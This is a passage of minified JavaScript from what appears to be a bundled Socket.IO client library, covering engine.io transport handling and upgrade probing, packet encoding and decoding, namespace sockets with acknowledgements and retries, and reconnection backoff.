              arguments.length > 1 && void 0 !== arguments[1]
                ? arguments[1]
                : {};
            super(),
              (this.writeBuffer = []),
              e && "object" === typeof e && ((t = e), (e = null)),
              e
                ? ((e = G(e)),
                  (t.hostname = e.host),
                  (t.secure = "https" === e.protocol || "wss" === e.protocol),
                  (t.port = e.port),
                  e.query && (t.query = e.query))
                : t.host && (t.hostname = G(t.host).host),
              x(this, t),
              (this.secure =
                null != t.secure
                  ? t.secure
                  : "undefined" !== typeof location &&
                    "https:" === location.protocol),
              t.hostname && !t.port && (t.port = this.secure ? "443" : "80"),
              (this.hostname =
                t.hostname ||
                ("undefined" !== typeof location
                  ? location.hostname
                  : "localhost")),
              (this.port =
                t.port ||
                ("undefined" !== typeof location && location.port
                  ? location.port
                  : this.secure
                  ? "443"
                  : "80")),
              (this.transports = t.transports || ["polling", "websocket"]),
              (this.writeBuffer = []),
              (this.prevBufferLen = 0),
              (this.opts = Object.assign(
                {
                  path: "/engine.io",
                  agent: !1,
                  withCredentials: !1,
                  upgrade: !0,
                  timestampParam: "t",
                  rememberUpgrade: !1,
                  addTrailingSlash: !0,
                  rejectUnauthorized: !0,
                  perMessageDeflate: { threshold: 1024 },
                  transportOptions: {},
                  closeOnBeforeunload: !0,
                },
                t
              )),
              (this.opts.path =
                this.opts.path.replace(/\/$/, "") +
                (this.opts.addTrailingSlash ? "/" : "")),
              "string" === typeof this.opts.query &&
                (this.opts.query = (function (e) {
                  let t = {},
                    n = e.split("&");
                  for (let r = 0, i = n.length; r < i; r++) {
                    let e = n[r].split("=");
                    t[decodeURIComponent(e[0])] = decodeURIComponent(e[1]);
                  }
                  return t;
                })(this.opts.query)),
              (this.id = null),
              (this.upgrades = null),
              (this.pingInterval = null),
              (this.pingTimeout = null),
              (this.pingTimeoutTimer = null),
              "function" === typeof addEventListener &&
                (this.opts.closeOnBeforeunload &&
                  ((this.beforeunloadEventListener = () => {
                    this.transport &&
                      (this.transport.removeAllListeners(),
                      this.transport.close());
                  }),
                  addEventListener(
                    "beforeunload",
                    this.beforeunloadEventListener,
                    !1
                  )),
                "localhost" !== this.hostname &&
                  ((this.offlineEventListener = () => {
                    this.onClose("transport close", {
                      description: "network connection lost",
                    });
                  }),
                  addEventListener("offline", this.offlineEventListener, !1))),
              this.open();
          }
          createTransport(e) {
            const t = Object.assign({}, this.opts.query);
            (t.EIO = 4), (t.transport = e), this.id && (t.sid = this.id);
            const n = Object.assign(
              {},
              this.opts.transportOptions[e],
              this.opts,
              {
                query: t,
                socket: this,
                hostname: this.hostname,
                secure: this.secure,
                port: this.port,
              }
            );
            return new W[e](n);
          }
          open() {
            let e;
            if (
              this.opts.rememberUpgrade &&
              Y.priorWebsocketSuccess &&
              -1 !== this.transports.indexOf("websocket")
            )
              e = "websocket";
            else {
              if (0 === this.transports.length)
                return void this.setTimeoutFn(() => {
                  this.emitReserved("error", "No transports available");
                }, 0);
              e = this.transports[0];
            }
            this.readyState = "opening";
            try {
              e = this.createTransport(e);
            } catch (t) {
              return this.transports.shift(), void this.open();
            }
            e.open(), this.setTransport(e);
          }
          setTransport(e) {
            this.transport && this.transport.removeAllListeners(),
              (this.transport = e),
              e
                .on("drain", this.onDrain.bind(this))
                .on("packet", this.onPacket.bind(this))
                .on("error", this.onError.bind(this))
                .on("close", (e) => this.onClose("transport close", e));
          }
          probe(e) {
            let t = this.createTransport(e),
              n = !1;
            Y.priorWebsocketSuccess = !1;
            const r = () => {
              n ||
                (t.send([{ type: "ping", data: "probe" }]),
                t.once("packet", (e) => {
                  if (!n)
                    if ("pong" === e.type && "probe" === e.data) {
                      if (
                        ((this.upgrading = !0),
                        this.emitReserved("upgrading", t),
                        !t)
                      )
                        return;
                      (Y.priorWebsocketSuccess = "websocket" === t.name),
                        this.transport.pause(() => {
                          n ||
                            ("closed" !== this.readyState &&
                              (c(),
                              this.setTransport(t),
                              t.send([{ type: "upgrade" }]),
                              this.emitReserved("upgrade", t),
                              (t = null),
                              (this.upgrading = !1),
                              this.flush()));
                        });
                    } else {
                      const e = new Error("probe error");
                      (e.transport = t.name),
                        this.emitReserved("upgradeError", e);
                    }
                }));
            };
            function i() {
              n || ((n = !0), c(), t.close(), (t = null));
            }
            const o = (e) => {
              const n = new Error("probe error: " + e);
              (n.transport = t.name), i(), this.emitReserved("upgradeError", n);
            };
            function s() {
              o("transport closed");
            }
            function a() {
              o("socket closed");
            }
            function l(e) {
              t && e.name !== t.name && i();
            }
            const c = () => {
              t.removeListener("open", r),
                t.removeListener("error", o),
                t.removeListener("close", s),
                this.off("close", a),
                this.off("upgrading", l);
            };
            t.once("open", r),
              t.once("error", o),
              t.once("close", s),
              this.once("close", a),
              this.once("upgrading", l),
              t.open();
          }
          onOpen() {
            if (
              ((this.readyState = "open"),
              (Y.priorWebsocketSuccess = "websocket" === this.transport.name),
              this.emitReserved("open"),
              this.flush(),
              "open" === this.readyState && this.opts.upgrade)
            ) {
              let e = 0;
              const t = this.upgrades.length;
              for (; e < t; e++) this.probe(this.upgrades[e]);
            }
          }
          onPacket(e) {
            if (
              "opening" === this.readyState ||
              "open" === this.readyState ||
              "closing" === this.readyState
            )
              switch (
                (this.emitReserved("packet", e),
                this.emitReserved("heartbeat"),
                e.type)
              ) {
                case "open":
                  this.onHandshake(JSON.parse(e.data));
                  break;
                case "ping":
                  this.resetPingTimeout(),
                    this.sendPacket("pong"),
                    this.emitReserved("ping"),
                    this.emitReserved("pong");
                  break;
                case "error":
                  const t = new Error("server error");
                  (t.code = e.data), this.onError(t);
                  break;
                case "message":
                  this.emitReserved("data", e.data),
                    this.emitReserved("message", e.data);
              }
          }
          onHandshake(e) {
            this.emitReserved("handshake", e),
              (this.id = e.sid),
              (this.transport.query.sid = e.sid),
              (this.upgrades = this.filterUpgrades(e.upgrades)),
              (this.pingInterval = e.pingInterval),
              (this.pingTimeout = e.pingTimeout),
              (this.maxPayload = e.maxPayload),
              this.onOpen(),
              "closed" !== this.readyState && this.resetPingTimeout();
          }
          resetPingTimeout() {
            this.clearTimeoutFn(this.pingTimeoutTimer),
              (this.pingTimeoutTimer = this.setTimeoutFn(() => {
                this.onClose("ping timeout");
              }, this.pingInterval + this.pingTimeout)),
              this.opts.autoUnref && this.pingTimeoutTimer.unref();
          }
          onDrain() {
            this.writeBuffer.splice(0, this.prevBufferLen),
              (this.prevBufferLen = 0),
              0 === this.writeBuffer.length
                ? this.emitReserved("drain")
                : this.flush();
          }
          flush() {
            if (
              "closed" !== this.readyState &&
              this.transport.writable &&
              !this.upgrading &&
              this.writeBuffer.length
            ) {
              const e = this.getWritablePackets();
              this.transport.send(e),
                (this.prevBufferLen = e.length),
                this.emitReserved("flush");
            }
          }
          getWritablePackets() {
            if (
              !(
                this.maxPayload &&
                "polling" === this.transport.name &&
                this.writeBuffer.length > 1
              )
            )
              return this.writeBuffer;
            let e = 1;
            for (let n = 0; n < this.writeBuffer.length; n++) {
              const r = this.writeBuffer[n].data;
              if (
                (r &&
                  (e +=
                    "string" === typeof (t = r)
                      ? (function (e) {
                          let t = 0,
                            n = 0;
                          for (let r = 0, i = e.length; r < i; r++)
                            (t = e.charCodeAt(r)),
                              t < 128
                                ? (n += 1)
                                : t < 2048
                                ? (n += 2)
                                : t < 55296 || t >= 57344
                                ? (n += 3)
                                : (r++, (n += 4));
                          return n;
                        })(t)
                      : Math.ceil(1.33 * (t.byteLength || t.size))),
                n > 0 && e > this.maxPayload)
              )
                return this.writeBuffer.slice(0, n);
              e += 2;
            }
            var t;
            return this.writeBuffer;
          }
          write(e, t, n) {
            return this.sendPacket("message", e, t, n), this;
          }
          send(e, t, n) {
            return this.sendPacket("message", e, t, n), this;
          }
          sendPacket(e, t, n, r) {
            if (
              ("function" === typeof t && ((r = t), (t = void 0)),
              "function" === typeof n && ((r = n), (n = null)),
              "closing" === this.readyState || "closed" === this.readyState)
            )
              return;
            (n = n || {}).compress = !1 !== n.compress;
            const i = { type: e, data: t, options: n };
            this.emitReserved("packetCreate", i),
              this.writeBuffer.push(i),
              r && this.once("flush", r),
              this.flush();
          }
          close() {
            const e = () => {
                this.onClose("forced close"), this.transport.close();
              },
              t = () => {
                this.off("upgrade", t), this.off("upgradeError", t), e();
              },
              n = () => {
                this.once("upgrade", t), this.once("upgradeError", t);
              };
            return (
              ("opening" !== this.readyState && "open" !== this.readyState) ||
                ((this.readyState = "closing"),
                this.writeBuffer.length
                  ? this.once("drain", () => {
                      this.upgrading ? n() : e();
                    })
                  : this.upgrading
                  ? n()
                  : e()),
              this
            );
          }
          onError(e) {
            (Y.priorWebsocketSuccess = !1),
              this.emitReserved("error", e),
              this.onClose("transport error", e);
          }
          onClose(e, t) {
            ("opening" !== this.readyState &&
              "open" !== this.readyState &&
              "closing" !== this.readyState) ||
              (this.clearTimeoutFn(this.pingTimeoutTimer),
              this.transport.removeAllListeners("close"),
              this.transport.close(),
              this.transport.removeAllListeners(),
              "function" === typeof removeEventListener &&
                (removeEventListener(
                  "beforeunload",
                  this.beforeunloadEventListener,
                  !1
                ),
                removeEventListener("offline", this.offlineEventListener, !1)),
              (this.readyState = "closed"),
              (this.id = null),
              this.emitReserved("close", e, t),
              (this.writeBuffer = []),
              (this.prevBufferLen = 0));
          }
          filterUpgrades(e) {
            const t = [];
            let n = 0;
            const r = e.length;
            for (; n < r; n++) ~this.transports.indexOf(e[n]) && t.push(e[n]);
            return t;
          }
        }
        Y.protocol = 4;
        Y.protocol;
        const Z = "function" === typeof ArrayBuffer,
          J = (e) =>
            "function" === typeof ArrayBuffer.isView
              ? ArrayBuffer.isView(e)
              : e.buffer instanceof ArrayBuffer,
          X = Object.prototype.toString,
          Q =
            "function" === typeof Blob ||
            ("undefined" !== typeof Blob &&
              "[object BlobConstructor]" === X.call(Blob)),
          ee =
            "function" === typeof File ||
            ("undefined" !== typeof File &&
              "[object FileConstructor]" === X.call(File));
        function te(e) {
          return (
            (Z && (e instanceof ArrayBuffer || J(e))) ||
            (Q && e instanceof Blob) ||
            (ee && e instanceof File)
          );
        }
        function ne(e, t) {
          if (!e || "object" !== typeof e) return !1;
          if (Array.isArray(e)) {
            for (let t = 0, n = e.length; t < n; t++) if (ne(e[t])) return !0;
            return !1;
          }
          if (te(e)) return !0;
          if (
            e.toJSON &&
            "function" === typeof e.toJSON &&
            1 === arguments.length
          )
            return ne(e.toJSON(), !0);
          for (const n in e)
            if (Object.prototype.hasOwnProperty.call(e, n) && ne(e[n]))
              return !0;
          return !1;
        }
        function re(e) {
          const t = [],
            n = e.data,
            r = e;
          return (
            (r.data = ie(n, t)),
            (r.attachments = t.length),
            { packet: r, buffers: t }
          );
        }
        function ie(e, t) {
          if (!e) return e;
          if (te(e)) {
            const n = { _placeholder: !0, num: t.length };
            return t.push(e), n;
          }
          if (Array.isArray(e)) {
            const n = new Array(e.length);
            for (let r = 0; r < e.length; r++) n[r] = ie(e[r], t);
            return n;
          }
          if ("object" === typeof e && !(e instanceof Date)) {
            const n = {};
            for (const r in e)
              Object.prototype.hasOwnProperty.call(e, r) &&
                (n[r] = ie(e[r], t));
            return n;
          }
          return e;
        }
        function oe(e, t) {
          return (e.data = se(e.data, t)), delete e.attachments, e;
        }
        function se(e, t) {
          if (!e) return e;
          if (e && !0 === e._placeholder) {
            if ("number" === typeof e.num && e.num >= 0 && e.num < t.length)
              return t[e.num];
            throw new Error("illegal attachments");
          }
          if (Array.isArray(e))
            for (let n = 0; n < e.length; n++) e[n] = se(e[n], t);
          else if ("object" === typeof e)
            for (const n in e)
              Object.prototype.hasOwnProperty.call(e, n) &&
                (e[n] = se(e[n], t));
          return e;
        }
        const ae = [
            "connect",
            "connect_error",
            "disconnect",
            "disconnecting",
            "newListener",
            "removeListener",
          ],
          le = 5;
        var ce;
        !(function (e) {
          (e[(e.CONNECT = 0)] = "CONNECT"),
            (e[(e.DISCONNECT = 1)] = "DISCONNECT"),
            (e[(e.EVENT = 2)] = "EVENT"),
            (e[(e.ACK = 3)] = "ACK"),
            (e[(e.CONNECT_ERROR = 4)] = "CONNECT_ERROR"),
            (e[(e.BINARY_EVENT = 5)] = "BINARY_EVENT"),
            (e[(e.BINARY_ACK = 6)] = "BINARY_ACK");
        })(ce || (ce = {}));
        class ue {
          constructor(e) {
            this.replacer = e;
          }
          encode(e) {
            return (e.type !== ce.EVENT && e.type !== ce.ACK) || !ne(e)
              ? [this.encodeAsString(e)]
              : this.encodeAsBinary({
                  type: e.type === ce.EVENT ? ce.BINARY_EVENT : ce.BINARY_ACK,
                  nsp: e.nsp,
                  data: e.data,
                  id: e.id,
                });
          }
          encodeAsString(e) {
            let t = "" + e.type;
            return (
              (e.type !== ce.BINARY_EVENT && e.type !== ce.BINARY_ACK) ||
                (t += e.attachments + "-"),
              e.nsp && "/" !== e.nsp && (t += e.nsp + ","),
              null != e.id && (t += e.id),
              null != e.data && (t += JSON.stringify(e.data, this.replacer)),
              t
            );
          }
          encodeAsBinary(e) {
            const t = re(e),
              n = this.encodeAsString(t.packet),
              r = t.buffers;
            return r.unshift(n), r;
          }
        }
        function fe(e) {
          return "[object Object]" === Object.prototype.toString.call(e);
        }
        class he extends m {
          constructor(e) {
            super(), (this.reviver = e);
          }
          add(e) {
            let t;
            if ("string" === typeof e) {
              if (this.reconstructor)
                throw new Error(
                  "got plaintext data when reconstructing a packet"
                );
              t = this.decodeString(e);
              const n = t.type === ce.BINARY_EVENT;
              n || t.type === ce.BINARY_ACK
                ? ((t.type = n ? ce.EVENT : ce.ACK),
                  (this.reconstructor = new de(t)),
                  0 === t.attachments && super.emitReserved("decoded", t))
                : super.emitReserved("decoded", t);
            } else {
              if (!te(e) && !e.base64) throw new Error("Unknown type: " + e);
              if (!this.reconstructor)
                throw new Error(
                  "got binary data when not reconstructing a packet"
                );
              (t = this.reconstructor.takeBinaryData(e)),
                t &&
                  ((this.reconstructor = null),
                  super.emitReserved("decoded", t));
            }
          }
          decodeString(e) {
            let t = 0;
            const n = { type: Number(e.charAt(0)) };
            if (void 0 === ce[n.type])
              throw new Error("unknown packet type " + n.type);
            if (n.type === ce.BINARY_EVENT || n.type === ce.BINARY_ACK) {
              const r = t + 1;
              for (; "-" !== e.charAt(++t) && t != e.length; );
              const i = e.substring(r, t);
              if (i != Number(i) || "-" !== e.charAt(t))
                throw new Error("Illegal attachments");
              n.attachments = Number(i);
            }
            if ("/" === e.charAt(t + 1)) {
              const r = t + 1;
              for (; ++t; ) {
                if ("," === e.charAt(t)) break;
                if (t === e.length) break;
              }
              n.nsp = e.substring(r, t);
            } else n.nsp = "/";
            const r = e.charAt(t + 1);
            if ("" !== r && Number(r) == r) {
              const r = t + 1;
              for (; ++t; ) {
                const n = e.charAt(t);
                if (null == n || Number(n) != n) {
                  --t;
                  break;
                }
                if (t === e.length) break;
              }
              n.id = Number(e.substring(r, t + 1));
            }
            if (e.charAt(++t)) {
              const r = this.tryParse(e.substr(t));
              if (!he.isPayloadValid(n.type, r))
                throw new Error("invalid payload");
              n.data = r;
            }
            return n;
          }
          tryParse(e) {
            try {
              return JSON.parse(e, this.reviver);
            } catch (t) {
              return !1;
            }
          }
          static isPayloadValid(e, t) {
            switch (e) {
              case ce.CONNECT:
                return fe(t);
              case ce.DISCONNECT:
                return void 0 === t;
              case ce.CONNECT_ERROR:
                return "string" === typeof t || fe(t);
              case ce.EVENT:
              case ce.BINARY_EVENT:
                return (
                  Array.isArray(t) &&
                  ("number" === typeof t[0] ||
                    ("string" === typeof t[0] && -1 === ae.indexOf(t[0])))
                );
              case ce.ACK:
              case ce.BINARY_ACK:
                return Array.isArray(t);
            }
          }
          destroy() {
            this.reconstructor &&
              (this.reconstructor.finishedReconstruction(),
              (this.reconstructor = null));
          }
        }
        class de {
          constructor(e) {
            (this.packet = e), (this.buffers = []), (this.reconPack = e);
          }
          takeBinaryData(e) {
            if (
              (this.buffers.push(e),
              this.buffers.length === this.reconPack.attachments)
            ) {
              const e = oe(this.reconPack, this.buffers);
              return this.finishedReconstruction(), e;
            }
            return null;
          }
          finishedReconstruction() {
            (this.reconPack = null), (this.buffers = []);
          }
        }
        function pe(e, t, n) {
          return (
            e.on(t, n),
            function () {
              e.off(t, n);
            }
          );
        }
        const ge = Object.freeze({
          connect: 1,
          connect_error: 1,
          disconnect: 1,
          disconnecting: 1,
          newListener: 1,
          removeListener: 1,
        });
        class ye extends m {
          constructor(e, t, n) {
            super(),
              (this.connected = !1),
              (this.recovered = !1),
              (this.receiveBuffer = []),
              (this.sendBuffer = []),
              (this._queue = []),
              (this._queueSeq = 0),
              (this.ids = 0),
              (this.acks = {}),
              (this.flags = {}),
              (this.io = e),
              (this.nsp = t),
              n && n.auth && (this.auth = n.auth),
              (this._opts = Object.assign({}, n)),
              this.io._autoConnect && this.open();
          }
          get disconnected() {
            return !this.connected;
          }
          subEvents() {
            if (this.subs) return;
            const e = this.io;
            this.subs = [
              pe(e, "open", this.onopen.bind(this)),
              pe(e, "packet", this.onpacket.bind(this)),
              pe(e, "error", this.onerror.bind(this)),
              pe(e, "close", this.onclose.bind(this)),
            ];
          }
          get active() {
            return !!this.subs;
          }
          connect() {
            return (
              this.connected ||
                (this.subEvents(),
                this.io._reconnecting || this.io.open(),
                "open" === this.io._readyState && this.onopen()),
              this
            );
          }
          open() {
            return this.connect();
          }
          send() {
            for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++)
              t[n] = arguments[n];
            return t.unshift("message"), this.emit.apply(this, t), this;
          }
          emit(e) {
            if (ge.hasOwnProperty(e))
              throw new Error(
                '"' + e.toString() + '" is a reserved event name'
              );
            for (
              var t = arguments.length, n = new Array(t > 1 ? t - 1 : 0), r = 1;
              r < t;
              r++
            )
              n[r - 1] = arguments[r];
            if (
              (n.unshift(e),
              this._opts.retries &&
                !this.flags.fromQueue &&
                !this.flags.volatile)
            )
              return this._addToQueue(n), this;
            const i = { type: ce.EVENT, data: n, options: {} };
            if (
              ((i.options.compress = !1 !== this.flags.compress),
              "function" === typeof n[n.length - 1])
            ) {
              const e = this.ids++,
                t = n.pop();
              this._registerAckCallback(e, t), (i.id = e);
            }
            const o =
              this.io.engine &&
              this.io.engine.transport &&
              this.io.engine.transport.writable;
            return (
              (this.flags.volatile && (!o || !this.connected)) ||
                (this.connected
                  ? (this.notifyOutgoingListeners(i), this.packet(i))
                  : this.sendBuffer.push(i)),
              (this.flags = {}),
              this
            );
          }
          _registerAckCallback(e, t) {
            var n,
              r = this;
            const i =
              null !== (n = this.flags.timeout) && void 0 !== n
                ? n
                : this._opts.ackTimeout;
            if (void 0 === i) return void (this.acks[e] = t);
            const o = this.io.setTimeoutFn(() => {
              delete this.acks[e];
              for (let t = 0; t < this.sendBuffer.length; t++)
                this.sendBuffer[t].id === e && this.sendBuffer.splice(t, 1);
              t.call(this, new Error("operation has timed out"));
            }, i);
            this.acks[e] = function () {
              r.io.clearTimeoutFn(o);
              for (
                var e = arguments.length, n = new Array(e), i = 0;
                i < e;
                i++
              )
                n[i] = arguments[i];
              t.apply(r, [null, ...n]);
            };
          }
          emitWithAck(e) {
            for (
              var t = arguments.length, n = new Array(t > 1 ? t - 1 : 0), r = 1;
              r < t;
              r++
            )
              n[r - 1] = arguments[r];
            const i =
              void 0 !== this.flags.timeout || void 0 !== this._opts.ackTimeout;
            return new Promise((t, r) => {
              n.push((e, n) => (i ? (e ? r(e) : t(n)) : t(e))),
                this.emit(e, ...n);
            });
          }
          _addToQueue(e) {
            var t = this;
            let n;
            "function" === typeof e[e.length - 1] && (n = e.pop());
            const r = {
              id: this._queueSeq++,
              tryCount: 0,
              pending: !1,
              args: e,
              flags: Object.assign({ fromQueue: !0 }, this.flags),
            };
            e.push(function (e) {
              if (r !== t._queue[0]) return;
              if (null !== e)
                r.tryCount > t._opts.retries && (t._queue.shift(), n && n(e));
              else if ((t._queue.shift(), n)) {
                for (
                  var i = arguments.length,
                    o = new Array(i > 1 ? i - 1 : 0),
                    s = 1;
                  s < i;
                  s++
                )
                  o[s - 1] = arguments[s];
                n(null, ...o);
              }
              return (r.pending = !1), t._drainQueue();
            }),
              this._queue.push(r),
              this._drainQueue();
          }
          _drainQueue() {
            let e =
              arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
            if (!this.connected || 0 === this._queue.length) return;
            const t = this._queue[0];
            (t.pending && !e) ||
              ((t.pending = !0),
              t.tryCount++,
              (this.flags = t.flags),
              this.emit.apply(this, t.args));
          }
          packet(e) {
            (e.nsp = this.nsp), this.io._packet(e);
          }
          onopen() {
            "function" == typeof this.auth
              ? this.auth((e) => {
                  this._sendConnectPacket(e);
                })
              : this._sendConnectPacket(this.auth);
          }
          _sendConnectPacket(e) {
            this.packet({
              type: ce.CONNECT,
              data: this._pid
                ? Object.assign({ pid: this._pid, offset: this._lastOffset }, e)
                : e,
            });
          }
          onerror(e) {
            this.connected || this.emitReserved("connect_error", e);
          }
          onclose(e, t) {
            (this.connected = !1),
              delete this.id,
              this.emitReserved("disconnect", e, t);
          }
          onpacket(e) {
            if (e.nsp === this.nsp)
              switch (e.type) {
                case ce.CONNECT:
                  e.data && e.data.sid
                    ? this.onconnect(e.data.sid, e.data.pid)
                    : this.emitReserved(
                        "connect_error",
                        new Error(
                          "It seems you are trying to reach a Socket.IO server in v2.x with a v3.x client, but they are not compatible (more information here: https://socket.io/docs/v3/migrating-from-2-x-to-3-0/)"
                        )
                      );
                  break;
                case ce.EVENT:
                case ce.BINARY_EVENT:
                  this.onevent(e);
                  break;
                case ce.ACK:
                case ce.BINARY_ACK:
                  this.onack(e);
                  break;
                case ce.DISCONNECT:
                  this.ondisconnect();
                  break;
                case ce.CONNECT_ERROR:
                  this.destroy();
                  const t = new Error(e.data.message);
                  (t.data = e.data.data), this.emitReserved("connect_error", t);
              }
          }
          onevent(e) {
            const t = e.data || [];
            null != e.id && t.push(this.ack(e.id)),
              this.connected
                ? this.emitEvent(t)
                : this.receiveBuffer.push(Object.freeze(t));
          }
          emitEvent(e) {
            if (this._anyListeners && this._anyListeners.length) {
              const t = this._anyListeners.slice();
              for (const n of t) n.apply(this, e);
            }
            super.emit.apply(this, e),
              this._pid &&
                e.length &&
                "string" === typeof e[e.length - 1] &&
                (this._lastOffset = e[e.length - 1]);
          }
          ack(e) {
            const t = this;
            let n = !1;
            return function () {
              if (!n) {
                n = !0;
                for (
                  var r = arguments.length, i = new Array(r), o = 0;
                  o < r;
                  o++
                )
                  i[o] = arguments[o];
                t.packet({ type: ce.ACK, id: e, data: i });
              }
            };
          }
          onack(e) {
            const t = this.acks[e.id];
            "function" === typeof t &&
              (t.apply(this, e.data), delete this.acks[e.id]);
          }
          onconnect(e, t) {
            (this.id = e),
              (this.recovered = t && this._pid === t),
              (this._pid = t),
              (this.connected = !0),
              this.emitBuffered(),
              this.emitReserved("connect"),
              this._drainQueue(!0);
          }
          emitBuffered() {
            this.receiveBuffer.forEach((e) => this.emitEvent(e)),
              (this.receiveBuffer = []),
              this.sendBuffer.forEach((e) => {
                this.notifyOutgoingListeners(e), this.packet(e);
              }),
              (this.sendBuffer = []);
          }
          ondisconnect() {
            this.destroy(), this.onclose("io server disconnect");
          }
          destroy() {
            this.subs && (this.subs.forEach((e) => e()), (this.subs = void 0)),
              this.io._destroy(this);
          }
          disconnect() {
            return (
              this.connected && this.packet({ type: ce.DISCONNECT }),
              this.destroy(),
              this.connected && this.onclose("io client disconnect"),
              this
            );
          }
          close() {
            return this.disconnect();
          }
          compress(e) {
            return (this.flags.compress = e), this;
          }
          get volatile() {
            return (this.flags.volatile = !0), this;
          }
          timeout(e) {
            return (this.flags.timeout = e), this;
          }
          onAny(e) {
            return (
              (this._anyListeners = this._anyListeners || []),
              this._anyListeners.push(e),
              this
            );
          }
          prependAny(e) {
            return (
              (this._anyListeners = this._anyListeners || []),
              this._anyListeners.unshift(e),
              this
            );
          }
          offAny(e) {
            if (!this._anyListeners) return this;
            if (e) {
              const t = this._anyListeners;
              for (let n = 0; n < t.length; n++)
                if (e === t[n]) return t.splice(n, 1), this;
            } else this._anyListeners = [];
            return this;
          }
          listenersAny() {
            return this._anyListeners || [];
          }
          onAnyOutgoing(e) {
            return (
              (this._anyOutgoingListeners = this._anyOutgoingListeners || []),
              this._anyOutgoingListeners.push(e),
              this
            );
          }
          prependAnyOutgoing(e) {
            return (
              (this._anyOutgoingListeners = this._anyOutgoingListeners || []),
              this._anyOutgoingListeners.unshift(e),
              this
            );
          }
          offAnyOutgoing(e) {
            if (!this._anyOutgoingListeners) return this;
            if (e) {
              const t = this._anyOutgoingListeners;
              for (let n = 0; n < t.length; n++)
                if (e === t[n]) return t.splice(n, 1), this;
            } else this._anyOutgoingListeners = [];
            return this;
          }
          listenersAnyOutgoing() {
            return this._anyOutgoingListeners || [];
          }
          notifyOutgoingListeners(e) {
            if (
              this._anyOutgoingListeners &&
              this._anyOutgoingListeners.length
            ) {
              const t = this._anyOutgoingListeners.slice();
              for (const n of t) n.apply(this, e.data);
            }
          }
        }
        function we(e) {
          (e = e || {}),
            (this.ms = e.min || 100),
            (this.max = e.max || 1e4),
            (this.factor = e.factor || 2),
            (this.jitter = e.jitter > 0 && e.jitter <= 1 ? e.jitter : 0),
            (this.attempts = 0);
        }
        (we.prototype.duration = function () {
          var e = this.ms * Math.pow(this.factor, this.attempts++);
          if (this.jitter) {
            var t = Math.random(),
              n = Math.floor(t * this.jitter * e);
            e = 0 == (1 & Math.floor(10 * t)) ? e - n : e + n;
          }
          return 0 | Math.min(e, this.max);
        }),
          (we.prototype.reset = function () {
            this.attempts = 0;
          }),
          (we.prototype.setMin = function (e) {
            this.ms = e;
          }),
          (we.prototype.setMax = function (e) {
            this.max = e;
          }),
          (we.prototype.setJitter = function (e) {
            this.jitter = e;
          });
        class me extends m {
          constructor(e, t) {
            var n;
            super(),
              (this.nsps = {}),
              (this.subs = []),
              e && "object" === typeof e && ((t = e), (e = void 0)),
              ((t = t || {}).path = t.path || "/socket.io"),
              (this.opts = t),
              x(this, t),
              this.reconnection(!1 !== t.reconnection),
              this.reconnectionAttempts(t.reconnectionAttempts || 1 / 0),
              this.reconnectionDelay(t.reconnectionDelay || 1e3),
              this.reconnectionDelayMax(t.reconnectionDelayMax || 5e3),
              this.randomizationFactor(
                null !== (n = t.randomizationFactor) && void 0 !== n ? n : 0.5
              ),
              (this.backoff = new we({
                min: this.reconnectionDelay(),
                max: this.reconnectionDelayMax(),
                jitter: this.randomizationFactor(),
              })),
              this.timeout(null == t.timeout ? 2e4 : t.timeout),
              (this._readyState = "closed"),
              (this.uri = e);
            const i = t.parser || r;
            (this.encoder = new i.Encoder()),
              (this.decoder = new i.Decoder()),
              (this._autoConnect = !1 !== t.autoConnect),
              this._autoConnect && this.open();
          }
          reconnection(e) {
            return arguments.length
              ? ((this._reconnection = !!e), this)
              : this._reconnection;
          }
          reconnectionAttempts(e) {
            return void 0 === e
              ? this._reconnectionAttempts
              : ((this._reconnectionAttempts = e), this);
          }
          reconnectionDelay(e) {
            var t;
            return void 0 === e
              ? this._reconnectionDelay
              : ((this._reconnectionDelay = e),
                null === (t = this.backoff) || void 0 === t || t.setMin(e),
                this);
          }
          randomizationFactor(e) {
            var t;
            return void 0 === e
              ? this._randomizationFactor
              : ((this._randomizationFactor = e),
                null === (t = this.backoff) || void 0 === t || t.setJitter(e),
                this);
          }
          reconnectionDelayMax(e) {
            var t;
            return void 0 === e
              ? this._reconnectionDelayMax
              : ((this._reconnectionDelayMax = e),
                null === (t = this.backoff) || void 0 === t || t.setMax(e),
                this);
          }
          timeout(e) {
            return arguments.length
              ? ((this._timeout = e), this)
              : this._timeout;
          }
          maybeReconnectOnOpen() {
            !this._reconnecting &&
              this._reconnection &&
              0 === this.backoff.attempts &&
              this.reconnect();
          }
          open(e) {
            if (~this._readyState.indexOf("open")) return this;
            this.engine = new Y(this.uri, this.opts);
            const t = this.engine,
              n = this;
            (this._readyState = "opening"), (this.skipReconnect = !1);
            const r = pe(t, "open", function () {
                n.onopen(), e && e();
              }),
              i = pe(t, "error", (t) => {
                n.cleanup(),
                  (n._readyState = "closed"),
                  this.emitReserved("error", t),
                  e ? e(t) : n.maybeReconnectOnOpen();
              });
            if (!1 !== this._timeout) {
              const e = this._timeout;
              0 === e && r();
              const n = this.setTimeoutFn(() => {
                r(), t.close(), t.emit("error", new Error("timeout"));
              }, e);
              this.opts.autoUnref && n.unref(),
                this.subs.push(function () {
                  clearTimeout(n);
                });
            }
            return this.subs.push(r), this.subs.push(i), this;
          }
          connect(e) {
            return this.open(e);
          }
          onopen() {
            this.cleanup(),
              (this._readyState = "open"),
              this.emitReserved("open");
            const e = this.engine;
            this.subs.push(
              pe(e, "ping", this.onping.bind(this)),
              pe(e, "data", this.ondata.bind(this)),
              pe(e, "error", this.onerror.bind(this)),
              pe(e, "close", this.onclose.bind(this)),
              pe(this.decoder, "decoded", this.ondecoded.bind(this))
            );
          }
          onping() {
            this.emitReserved("ping");
          }
          ondata(e) {
            try {
              this.decoder.add(e);
            } catch (t) {
              this.onclose("parse error", t);
            }
          }
          ondecoded(e) {
            j(() => {
              this.emitReserved("packet", e);
            }, this.setTimeoutFn);
          }
          onerror(e) {
            this.emitReserved("error", e);
          }
          socket(e, t) {
            let n = this.nsps[e];
            return (
              n
                ? this._autoConnect && !n.active && n.connect()
                : ((n = new ye(this, e, t)), (this.nsps[e] = n)),
              n
            );
          }
          _destroy(e) {
            const t = Object.keys(this.nsps);
            for (const n of t) {
              if (this.nsps[n].active) return;
            }
            this._close();
          }
          _packet(e) {
            const t = this.encoder.encode(e);
            for (let n = 0; n < t.length; n++)
              this.engine.write(t[n], e.options);
          }
          cleanup() {
            this.subs.forEach((e) => e()),
              (this.subs.length = 0),
              this.decoder.destroy();
          }
          _close() {
            (this.skipReconnect = !0),
